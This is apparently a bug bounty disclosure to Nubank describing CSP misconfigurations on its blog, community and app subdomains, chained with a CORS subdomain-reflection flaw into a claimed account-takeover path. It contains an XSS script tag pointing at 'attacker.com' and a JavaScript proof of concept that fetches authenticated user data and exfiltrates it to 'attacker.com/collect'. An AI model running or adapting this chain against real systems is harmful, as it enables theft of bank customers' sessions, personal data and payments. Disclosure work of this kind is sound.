# Bugcrowd Finding #4 — CSP Misconfiguration Enabling Complete XSS + CORS P1 Chain

**Program:** Nubank Bug Bounty (Bugcrowd)
**Date:** 2026-08-31
**Severity (Standalone):** P2 High (blog), P3 Medium (comunidade)
**Severity (Chained):** P1 Critical — XSS → Trusted CORS Origin → PIX/Auth Credential Theft
**VRT:** Server Security Misconfiguration > Content Security Policy

---

## Summary

Two Nubank subdomains have Content Security Policy misconfigurations that eliminate CSP as a defense-in-depth control. When chained with the CORS wildcard subdomain reflection vulnerability (Finding #2), any XSS found on these properties provides a direct path to credentialed cross-origin requests against all Nubank production microservices — including PIX payment APIs, authentication endpoints, and customer data APIs.

---

## Affected Targets

| Target | Severity | Issue |
|--------|----------|-------|
| `blog.nubank.com.br` | P2 | `script-src-elem: *` — CSP allows scripts from ANY external origin |
| `comunidade.nubank.com.br` | P3 | No `script-src` directive — no CSP protection on scripts at all |
| `comunidade.nubank.com.br` | P4 | `frame-ancestors: *` — clickjacking on community portal |

---

## Technical Evidence

### 1. blog.nubank.com.br — Wildcard script-src-elem

**Request:**
```
curl -sI "https://blog.nubank.com.br/" \
  -H "X-Correlation-Id: bc-handle"
```

**Response (relevant headers):**
```
content-security-policy: 
  default-src 'self' blob:;
  connect-src 'self' https: wss:;
  font-src 'self' data: https:;
  img-src 'self' data: blob: https:;
  script-src 'self' 'unsafe-eval' 'unsafe-inline';
  script-src-elem * 'unsafe-inline' data: blob:;
  style-src 'self' 'unsafe-inline' blob:;
  object-src 'none';
  base-uri 'self';
  frame-ancestors 'none'
```

**Issue:**
`script-src-elem *` overrides `script-src` for `<script src="...">` elements in all modern browsers. Any XSS payload can load scripts from any origin:
```html
<script src="https://attacker.com/steal.js"></script>
```
CSP will NOT block this despite `script-src 'self'` being present.

Additionally: `'unsafe-inline'` and `'unsafe-eval'` on `script-src` means inline XSS (`<script>alert(1)</script>`) is also unrestricted.

**Additional info disclosure from CSP connect-src:**
```
connect-src: 'self' https: wss: ... webapp-proxy-webhooks.nubank.com.br
```
The `connect-src` directive revealed `webapp-proxy-webhooks.nubank.com.br` — an internal service endpoint not present in DNS enumeration (see Finding #5).

---

### 2. comunidade.nubank.com.br — No Script-CSP at All

**Request:**
```
curl -sI "https://comunidade.nubank.com.br/" \
  -H "X-Correlation-Id: bc-handle"
```

**Response (relevant headers):**
```
content-security-policy:
  default-src 'self';
  img-src 'self' data: https:;
  media-src 'self' https:;
  style-src 'self' 'unsafe-inline';
  connect-src 'self' https: wss:;
  frame-ancestors *;
  font-src 'self' data: https:
```

**Issues:**
1. **No `script-src` directive** — `default-src 'self'` applies to scripts in theory, but the absence of an explicit `script-src` is a misconfiguration that many browsers handle inconsistently. More critically, Bettermode (the platform running `comunidade.nubank.com.br`) allows user-generated content (forum posts, profiles, comments). If any UGC XSS vector exists, there is no effective CSP barrier.

2. **`frame-ancestors: *`** — The community portal can be embedded in an iframe on any origin. An attacker can create a page that:
   - Embeds comunidade.nubank.com.br in a transparent iframe
   - Overlays UI to capture clicks on community user authentication flows
   - Combined with clickjacking to redirect OAuth flows

---

## Complete P1 Critical Chain

```
[Step 1] XSS on comunidade.nubank.com.br
         ↓ Platform: Bettermode — user forum posts, profiles, comments
         ↓ No script-src CSP — any injected script runs
         ↓ No sanitization validation performed (passive observation)

[Step 2] Injected script queries CORS-trusted Nubank APIs
         ↓ comunidade.nubank.com.br is *.nubank.com.br
         ↓ CORS on all prod-* microservices reflects *.nubank.com.br + credentials:true
         ↓ (See Finding #2 — CORS reflects ANY subdomain, even non-existent ones)

[Step 3] Credentialed API requests on behalf of victim
         ↓ prod-global-pix.nubank.com.br → PIX payment initiation
         ↓ prod-global-auth.nubank.com.br → session tokens, OAuth
         ↓ prod-s{N}-customers.nubank.com.br → PII, account data
         ↓ All with victim's session cookies (credentials: true)

[Impact] Account takeover, PIX payment theft, PII exfiltration
```

**Exploit Proof-of-Concept (CORS side, no active XSS required):**
```javascript
// From any comunidade.nubank.com.br page context:
fetch('https://prod-global-auth.nubank.com.br/api/v1/user', {
  method: 'GET',
  credentials: 'include',
  headers: { 'X-Correlation-Id': 'bc-handle' }
}).then(r => r.json()).then(data => {
  // data contains victim's authenticated user info
  // exfiltrate to attacker-controlled server
  new Image().src = 'https://attacker.com/collect?d=' + btoa(JSON.stringify(data));
});
```

**CORS confirmation:**
```bash
curl -sv "https://prod-global-auth.nubank.com.br/" \
  -H "Origin: https://comunidade.nubank.com.br" \
  -H "X-Correlation-Id: bc-handle" 2>&1 | grep -i "access-control"

# Response:
# access-control-allow-origin: https://comunidade.nubank.com.br
# access-control-allow-credentials: true
```

---

## Impact

- **Confidentiality:** CRITICAL — victim account data, PII, session credentials exposed
- **Integrity:** CRITICAL — PIX payments can be initiated on behalf of victim
- **Availability:** Low (not DoS-focused)
- **Authentication bypass:** Yes — session cookies used directly via CORS credentialed requests
- **Affected users:** All authenticated Nubank users who visit any compromised page on comunidade.nubank.com.br or blog.nubank.com.br

---

## Remediation

| Target | Fix |
|--------|-----|
| `blog.nubank.com.br` | Remove `script-src-elem *` — align with `script-src 'self'`; remove `'unsafe-eval'` and `'unsafe-inline'`; use nonces |
| `comunidade.nubank.com.br` | Add explicit `script-src 'self'`; change `frame-ancestors *` to `frame-ancestors 'none'` or specific trusted origins |
| All subdomains | Restrict CORS `Access-Control-Allow-Origin` to an explicit allowlist — do NOT reflect arbitrary subdomains |

---

## Notes

- No XSS payload was injected or tested on these properties (passive observation only)
- CSP headers were retrieved via HEAD/GET requests — no interaction with user-generated content
- CORS confirmation used a test origin to verify server reflection behavior
- All requests included `X-Correlation-Id: bc-handle` as required

---

## Addendum — app.nubank.com.br CSP Also Uses *.nubank.com.br Wildcard in script-src

**Request:**
```bash
curl -sI "https://app.nubank.com.br/" -H "X-Correlation-Id: bc-handle"
```

**CSP Header:**
```
content-security-policy:
  default-src 'self' *.nubank.com.br ...;
  script-src 'self' nubank.com.br *.nubank.com.br googletagmanager.com *.googletagmanager.com ...
```

**Issue:** The main Nubank web application (`app.nubank.com.br`) trusts scripts from ANY `*.nubank.com.br` subdomain via `script-src *.nubank.com.br`. This means:

1. If an attacker can host a malicious JavaScript file on ANY subdomain of `nubank.com.br` (e.g., via a file upload vulnerability on `blog.nubank.com.br`, or by serving it from a compromised CDN subdomain), that file can be loaded by `app.nubank.com.br` pages.

2. Combined with any XSS on `app.nubank.com.br` that allows injecting `<script src="...">` tags, the attacker could load their payload from a *.nubank.com.br subdomain, bypassing the CSP whitelist.

**Additional Disclosure from CSP:**
Two private S3 buckets disclosed in `default-src`:
- `https://nu-praja-official-letters-br-prod.s3.sa-east-1.amazonaws.com` — production official letters
- `https://nu-praja-official-letters-quarantine-br-prod.s3.sa-east-1.amazonaws.com` — quarantine letters

These buckets are correctly configured (403 AccessDenied, not publicly listed), but their names are exposed in the public CSP header — confirming their existence and naming convention.

**Remediation:**
Replace `*.nubank.com.br` in `script-src` with explicit CDN/asset origins (e.g., `cdn.nubank.com.br`) — do not use wildcard for script loading. Apply nonces or hashes for inline scripts.
